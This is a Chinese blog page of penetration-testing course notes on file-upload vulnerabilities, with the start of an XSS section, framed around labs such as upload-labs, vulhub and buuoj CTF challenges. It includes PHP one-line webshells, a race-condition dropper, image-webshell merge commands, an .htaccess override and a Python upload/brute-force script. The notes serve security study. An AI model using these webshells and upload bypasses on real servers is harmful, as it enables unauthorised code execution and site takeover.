@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lishang520.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="21、文件上传&amp;代码函数&amp;格式后缀&amp;场景 文件上传-测试场景WEB&amp;APP等  应用场景：只要一个地方可以上传，那么就可以进行文件上传测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="21-25、渗透测试(xiaodi)">
+<meta property="og:url" content="https://lishang520.github.io/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/index.html">
+<meta property="og:site_name" content="painter&#39;s Blog">
+<meta property="og:description" content="21、文件上传&amp;代码函数&amp;格式后缀&amp;场景 文件上传-测试场景WEB&amp;APP等  应用场景：只要一个地方可以上传，那么就可以进行文件上传测试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210802125224470.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210802125143909.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210802132810352.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210803122815756.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210803123117618.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210802202200990.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210804122650803.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210804213306095.png">
+<meta property="article:published_time" content="2021-08-10T11:40:25.000Z">
+<meta property="article:modified_time" content="2021-08-10T11:48:37.284Z">
+<meta property="article:author" content="painter">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lishang520.github.io/source/images/image-20210802125224470.png">
+
+<link rel="canonical" href="https://lishang520.github.io/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>21-25、渗透测试(xiaodi) | painter's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?24a57553e96b4b8b803c9794fd76b400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">painter's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/lishang520/" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lishang520.github.io/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E5%A4%B4%E5%83%8F.jpg">
+      <meta itemprop="name" content="painter">
+      <meta itemprop="description" content="painter的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="painter's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          21-25、渗透测试(xiaodi)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-10 19:40:25 / 修改时间：19:48:37" itemprop="dateCreated datePublished" datetime="2021-08-10T19:40:25+08:00">2021-08-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>21、文件上传&amp;代码函数&amp;格式后缀&amp;场景</p>
+<p>文件上传-测试场景WEB&amp;APP等</p>
+<ul>
+<li>应用场景：只要一个地方可以上传，那么就可以进行文件上传测试<span id="more"></span>
+<ul>
+<li>app<ul>
+<li><img src="/source/images/image-20210802125224470.png" alt="image-20210802125224470"></li>
+</ul>
+</li>
+<li>网站</li>
+<li>软件</li>
+<li>网站的聊天窗口，可以发送图片的那种<ul>
+<li><img src="/source/images/image-20210802125143909.png" alt="image-20210802125143909"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>文件上传-基本知识后门文件格式解析</p>
+<ul>
+<li>特性：什么格式的代码，必须要用什么格式的后缀才能解析<ul>
+<li>比如php格式的一句话木马，必须要用php格式后缀才能被解析，如果采用txt后缀则不行</li>
+</ul>
+</li>
+</ul>
+<p>冰蝎下载地址：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">Releases · rebeyond/Behinder · GitHub</a></p>
+<p>#案例4-文件上传-基本知识举例代码函数原理</p>
+<p>例子：PHP文件上传处理操作 $_FILES&amp;表单</p>
+<p>大小，名字，类型，临时名，上传内容</p>
+<ul>
+<li><img src="/source/images/image-20210802132810352.png" alt="image-20210802132810352"></li>
+</ul>
+<h2 id="22、文件上传JS-amp-后缀黑白名单-amp-格式检测"><a href="#22、文件上传JS-amp-后缀黑白名单-amp-格式检测" class="headerlink" title="22、文件上传JS&amp;后缀黑白名单&amp;格式检测"></a>22、文件上传JS&amp;后缀黑白名单&amp;格式检测</h2><p>#知识点：</p>
+<p>1、过滤验证客户端及服务端差异</p>
+<ul>
+<li>分类<ul>
+<li>客户端验证：自己的电脑上的浏览器上的JavaScript进行验证</li>
+<li>服务端验证：服务器进行验证</li>
+</ul>
+</li>
+<li>怎么分辨到底是客户端还是服务的验证？<ul>
+<li>客户端<ul>
+<li>可以在上传的页面，右键—查看源代码—里面会有一串JavaScript代码进行限制</li>
+<li>如果我们上传一个不符合的格式的文件，它很快就弹出格式不正确，那么应该也是客户端验证，毕竟如果是服务端验证，会需要一点时间的</li>
+<li>在上传php的时候抓包，如果我们点击上传的时候抓包，抓不到包，那么肯定就是客户端验证了，如果是服务端验证，必定会有数据包的<ul>
+<li>易错点：为什么jpg可以抓到包而php抓不到？因为php触发拦截了，所以抓不到包，所以必须要通过上传php文件来进行测试</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>2、过滤验证检测后缀黑名单绕过</p>
+<ul>
+<li>黑名单好绕过</li>
+</ul>
+<p>3、过滤验证检测后缀白名单绕过</p>
+<ul>
+<li>修改mine</li>
+<li>0x00和%00截断（需要满足php版本小于5.3.4和关掉php的魔术引号才行）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1-后缀客户端验证-Js禁用&amp;Burp改包&amp;本地提交Pass01-客户端-验证方式绕过方法：	方法一：    	首先上传一张符合条件的图片（图片的内容里有一句话），然后抓包（此时可以抓到包，因为它是一张图片），然后修改数据包图片的后缀为php，这样就可以绕过了，同时该php可以直接用webshell工具进行连接，因为它里面包含了一句话木马     方法二：禁用js	#案例2-后缀黑名单验证-大小写&amp;加空格&amp;符号点&amp;::$DATA验证上传的后缀名是否在这个黑名单里，在的话一律不让上传Pass06-大小写-文件命名Pass07-加空格-系统特性Pass08-符号点-系统特性Pass09-::$DATA-系统特性Pass10-组合空格&amp;点-系统特性#案例3-后缀白名单验证-MIME修改&amp;%00截断&amp;0x00截断一、%00和0x00截断使用的前提条件：	（1）php版本必须小于5.3.4 	（2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off二、%00和0x00适用的位置：	%00一般用于url处，比如数据包的第一行，它一般拼接在url后面，比如下图的图一，在upload/ 后面拼接我们需要的文件名和后缀，接着在后面加上 %00 即可    0x00一般是在请求体中有一个上传的文件的保存路径的变量，我们需要在它后面拼接我们需要的文件名和后缀，比如1.php，然后在它后面按下空格，接着在hex的界面查看，将空格(hex下的20换成00即可)	    验证上传的后缀名是否在这里白名单里，不在的话一律不让上传Pass02-MIME-文件属性Pass12-%00-CVE-2015-2348Pass13-0x00-命名安全#案例4-后缀变异性验证-Finecms任意文件上传-验证MIME本地Finecms测试-配合Fofa搜索-&quot;FineCMS公益软件&quot;代码段：/finecms/dayrui/controllers/member/Account.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/source/images/image-20210803122815756.png" alt="image-20210803122815756"></p>
+<p><img src="/source/images/image-20210803123117618.png" alt="image-20210803123117618"></p>
+<p>文件上传靶场：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">GitHub - c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场</a></p>
+<p>文件上传流程图：</p>
+<ul>
+<li><img src="/source/images/image-20210802202200990.png" alt="image-20210802202200990"></li>
+</ul>
+<h2 id="23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染"><a href="#23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染" class="headerlink" title="23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染"></a>23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染</h2><p>1、过滤验证检测内容绕过</p>
+<p>2、过滤验证代码逻辑安全</p>
+<p>3、过滤验证解析&amp;格式&amp;规则</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1-检测内容-图片后门&amp;二次渲染检测内容：修改文件头，比如gif的文件头就是GIF89aPass14 图片后门Pass17 二次渲染（一般使用gif进行绕过）图片后门制作：    copy shell.jpg/b + shell.php/a s.jpg    copy merge.gif/b + shell.php/a s.gif    c32asm 对比前后图片，观察哪些数据保留了，然后将一句话插在里面，再次上传，观察一句话还在不在</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>#案例2-代码逻辑-单次过滤&amp;条件竞争</p>
+<ul>
+<li><p>Pass11 单次过滤</p>
+<ul>
+<li>只是过滤了一次，没有循环过滤，比如 pphphp  ,因为只过滤了一次，所以可以绕过</li>
+</ul>
+</li>
+<li><p>Pass18 条件竞争</p>
+<ul>
+<li><p>产生原因：先移动上传的文件，然后再对移动的文件进行过滤，就会产生条件竞争</p>
+</li>
+<li><p>基本原理：上传php木马文件，因为网站首先会移动我们的木马文件到其他目录，接着会对该文件进行过滤，比如如果是php后缀就会删除该文件，所以我们可以上传一个a.php文件，因为网站是先移动后过滤（删除），所以a.php文件在对方服务器上存在过，这时我们完全可以不停的上传该a.php文件，该a.php文件的内容就是在当前目录创建一个新文件，新文件的内容是一句话木马，所以一旦我们访问到了a.php,对方的服务器就会自动从创建一个内容为一句话木马的php文件，那么我们的目的就达到了</p>
+</li>
+<li><p>实现步骤：</p>
+<ul>
+<li><p>burp不停的上传a.php文件，a.php的代码必须是：</p>
+<ul>
+<li>```php<?php $file=fopen('x.php','w+');fwrite($file,'<?php @eval($_POST[x];?>‘);fclose($file);?&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    - 其次，不停的访问该上传的a.php文件，目的是触发它的php文件，让他创建shell</span><br><span class="line"></span><br><span class="line">    - 一旦访问成功，shell就创建成功，到时候只需要用webshell工具连接x.php即可，密码是x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</span><br><span class="line"></span><br><span class="line">- ![image-20210803123453617](/source/images/image-20210803123453617.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例3-解析安全-格式变异&amp;中间件解析比如：可以php5  或者phtml    这些后缀也可以被当作php来执行Pass03 php5对应Pass04 .htaccess   （适用于apache）Vulhub 解析漏洞-Nginx(cve2013&amp;解析)Mozhe 解析漏洞-IIS-内部文件上传系统测试htaccess文件：下面是代码，意思就是当我们将该.htaccess文件上传到对方目录，再上传一个shell.jpg的图片马，再访问该图片马，那么该shell.jpg也会被当作php执行GIF89a&lt;?php @eval($_POST[&#x27;s&#x27;]);phpinfo();?&gt;&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例4-CTF分享-Buuoj平台部分上传题库https://buuoj.cn/challenges[极客大挑战 2019]Upload	大挑战：限制了后缀、检测了文件头、不允许文件的内容里有 &lt;?    ，找不到上传的图片的地址    绕过：后缀改为phtml、加文件头GIF89a   、通过变异的一句话木马绕过，通过扫目录、猜解目录得到上传的文件的地址，比如这里就猜 /upload    变异的语句和木马如下（可自行百度，只要找到不包含问号的即可）：&lt;script language=&quot;php&quot;&gt;eval($_POST[x])&lt;/script&gt;// ]]&gt;&lt;/script&gt;参考连接：        [ACTF2020 新生赛]Upload[GXYCTF2019]BabyUpload......</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器"><a href="#24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器" class="headerlink" title="24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器"></a>24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器</h2><p>#知识点：</p>
+<p>1、文件上传常规类应用场景</p>
+<p>2、文件上传CMS类应用场景</p>
+<p>3、文件上传编辑器类应用场景</p>
+<p>4、文件上传中间件类应用场景</p>
+<p>5、文件上传CTF比赛类应用场景</p>
+<p>#思路点：</p>
+<ul>
+<li>文件上传不管是发现还是利用上都会根据产生层面而不同，</li>
+<li>常规无资料采用常规思路测试，有资料（往上搜索有的话）的情况下直接参考资料进行。</li>
+</ul>
+<p>#案例1-针对CMS类思路-phpcms</p>
+<ul>
+<li><p>思路：去往上搜索该cms的存在的漏洞，比如这里就是phpcms的上传漏洞，找到后直接根据别人给的资料进行复现即可</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sqyysec/p/6725870.html">https://www.cnblogs.com/sqyysec/p/6725870.html</a></p>
+</li>
+</ul>
+<p>#案例2-针对编辑器类思路-Ueditor</p>
+<ul>
+<li><p>怎么知道当前编辑器是什么编辑器？</p>
+<ul>
+<li>编辑器里有一个帮助按钮，点击查看一般就会有当前编辑器的信息</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_40293958/article/details/107208040">https://blog.csdn.net/sinat_40293958/article/details/107208040</a></p>
+</li>
+</ul>
+<p>编辑器类和cms类的区别？</p>
+<ul>
+<li>假设当前cms是已知的，也存在编辑器，那么我们怎么在网上搜索资料？<ul>
+<li>如果上传功能在编辑器，我们就搜索当前编辑器的上传漏洞，而不能搜索cms的上传漏洞，当然如果当前编辑器没有漏洞，那么可以根据当前cms的名称去搜索该cms的其他漏洞<ul>
+<li>编辑器图片<ul>
+<li><img src="/source/images/image-20210804122650803.png" alt="image-20210804122650803"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例3-针对中间件类思路-Weblogic（基于java环境）</p>
+<ul>
+<li><p>怎么发现当前网站有没有Weblogic？</p>
+<ul>
+<li>扫描端口，weblogic的端口是7001</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a></p>
+<ul>
+<li><p>该上传漏洞前提：需要账号密码</p>
+<ul>
+<li>账号密码的获取，可以采用默认密码或者爆破进行尝试</li>
+</ul>
+</li>
+<li><p>该上传漏洞需要jsp后门：因为是基于java环境的</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例4-针对CTF比赛类思路-[GXYCTF2019]&amp;[RoarCTF 2019]</p>
+<ul>
+<li>```python<br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload">https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload</a>&lt;FilesMatch “s.jpg”&gt;  SetHandler application/x-httpd-php</FilesMatch><script language='php'>assert($_REQUEST['cmd'])</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  [RoarCTF 2019]Simple Upload#前提：需要thinkphp基础，要知道怎么调用文件Tp-URL模式-代码审计-Pass21Py-构造上传-无回显命名-发包访问http://document.thinkphp.cn/manual_3_2.htmlimport requestsurl=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/index.php/home/index/upload&#x27;file1=&#123;&#x27;file&#x27;:open(&#x27;f:\\1.txt&#x27;,&#x27;r&#x27;)&#125;file2=&#123;&#x27;file[]&#x27;:open(&#x27;f:\\1.php&#x27;,&#x27;r&#x27;)&#125;r = requests.post(url,files = file1)print(r.text)r = requests.post(url,files = file2)print(r.text)r = requests.post(url, files = file1)print(r.text)&#x27;&#x27;&#x27;import requestsimport timefor i in range(736769,755374,1):    url=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/Public/Uploads//2021-03-14//604cf0b&#x27;    urls=url+str(i)+&#x27;.php&#x27;    #print(str(i))    code=requests.get(urls).status_codeif code==&#x27;200&#x27;:break    print(urls+&#x27;-&gt;&#x27;+str(code))    time.sleep(0.2)    </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>漏洞复现靶场：<a target="_blank" rel="noopener" href="https://www.vulhub.org/">https://www.vulhub.org/</a></p>
+<p>webshll地址：<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h2 id="—————文件上传总结———"><a href="#—————文件上传总结———" class="headerlink" title="—————文件上传总结———-"></a>—————文件上传总结———-</h2><p>总体思路：优先级从高到低，在上传的时候注意观察前端的提示和数据包的返回包</p>
+<ul>
+<li><p>编辑器上传</p>
+</li>
+<li><p>已知cms</p>
+</li>
+<li><p>常规上传</p>
+<ul>
+<li><p>使用正常的图片，然后fuzz它的后缀名，fuzz的字典：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts/">https://github.com/TheKingOfDuck/fuzzDicts/</a></p>
+<ul>
+<li>成功就是黑名单<ul>
+<li>接着修改文件内容，插入一句话，看能否成功<ul>
+<li>如果失败，就尝试修改IMIE，如果还不成功，就尝试修改文件头</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>失败就是白名单<ul>
+<li>白名单可以尝试如下方法<ul>
+<li>00截断</li>
+<li>0x00截断</li>
+<li>配合中间件解析漏洞：web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型"><a href="#25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型" class="headerlink" title="25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型"></a>25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型</h2><p>1、XSS跨站原理&amp;分类&amp;危害&amp;修复</p>
+<ul>
+<li><p>原理</p>
+<ul>
+<li>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</li>
+</ul>
+</li>
+<li><p>漏洞产生的地方</p>
+<ul>
+<li>数据交互的地方<ul>
+<li>​    get、post、headers</li>
+<li>​    反馈与浏览</li>
+<li>​    富文本编辑器</li>
+<li>​    各类标签插入和自定义</li>
+</ul>
+</li>
+<li>数据输出的地方<ul>
+<li>​    用户资料</li>
+<li>​    关键词、标签、说明</li>
+<li>​    文件上传</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>分类</p>
+<ul>
+<li>​    反射型（非持久型）<ul>
+<li>前提：必须要将构造的payload发送给被攻击者触发才有用，比较鸡肋</li>
+</ul>
+</li>
+<li>​    存储型（持久型）</li>
+<li>​    DOM型</li>
+<li>​    mXSS(突变型XSS) </li>
+<li>​    UXSS（通用型xss）</li>
+<li>​    Flash XSS</li>
+<li>​    UTF-7 XSS</li>
+<li>​    MHTML XSS</li>
+<li>​    CSS XSS </li>
+<li>​    VBScript XSS</li>
+<li>​    …….</li>
+</ul>
+</li>
+<li><p>​    危害</p>
+<ul>
+<li>​    网络钓鱼，包括获取各类用户账号；</li>
+<li>​    窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</li>
+<li>​    劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</li>
+<li>​    强制弹出广告页面、刷流量等；</li>
+<li>​    网页挂马；</li>
+<li>​    进行恶意操作，如任意篡改页面信息、删除文章等；</li>
